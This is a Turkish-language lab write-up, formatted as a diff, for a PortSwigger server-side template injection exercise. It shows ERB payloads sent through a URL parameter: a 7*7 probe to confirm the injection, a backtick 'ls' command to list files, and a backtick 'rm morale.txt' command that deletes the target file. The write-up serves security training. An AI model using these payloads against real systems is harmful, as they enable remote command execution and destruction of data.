@@ -1,0 +1,60 @@
+
+Lab: Basic server-side template injection
+
+url: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
+
+
+Amaç:
+
+Carlos kullanıcısından morale.txt dosyasını silmek.
+
+Analiz 1 :
+
+        -- GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
+        başlığı ile yapılan bir istek yakaladık
+
+        -- İstek üzerinde ERB şablonu zafiyet onayı almak için şu başlıkla ilerledik
+
+                " GET /?message=denemecom<%=7*7%> HTTP/2 "
+        dönen cevap "denemecom49" oldu       
+
+Sonuç 1:
+
+         -- ERB şablonu zafiyeti onaylandı.
+
+Analiz 2 :
+         -- Bazı komutlarla içeride gezinmeyi denedik fakat aldığımız çıktı syntax hatası yaptığımı söyledi
+        komutumuz " GET /?message=deneme.com<%=whoami%> HTTP/2 " bu şekilde olduğunda dönen cevap bir error mesajı oldu
+        "  <p class=is-warning>(erb):1:in `&lt;main&gt;&apos;: undefined local variable or method `ls&apos; for main:Object (NameError)
+            from /usr/lib/ruby/2.7.0/erb.rb:905:in `eval&apos;
+            from /usr/lib/ruby/2.7.0/erb.rb:905:in `result&apos;
+            from -e:4:in `&lt;main&gt;&apos;</p> "
+        
+        BİLGİ( Ruby dilinde komutlar ` ifadesi ile yapılır)
+
+         -- Komutu bilgiye göre güncelledim 
+
+         " GET /?message=denemecom<%=`ls`%> HTTP/2 "
+         dönen cevap şu oldu
+
+                    <div>
+                            denemecommorale.txt
+                    </div>
+
+ Sonuç 2:
+        -- Ruby dilinde komutların nasıl yazıldığını öğrenmiş olduk :)
+        -- Morale.txt bulunmuş oldu.Sıradaki adım bu dosyayı silmek.
+
+
+
+
+Sonuç:
+  -- GET /?message=denemecom<%=`rm morale.txt`%> HTTP/2 kommutu ile lab görevi tamamlandı.
+   
+
+
+
+
+                  
+
+
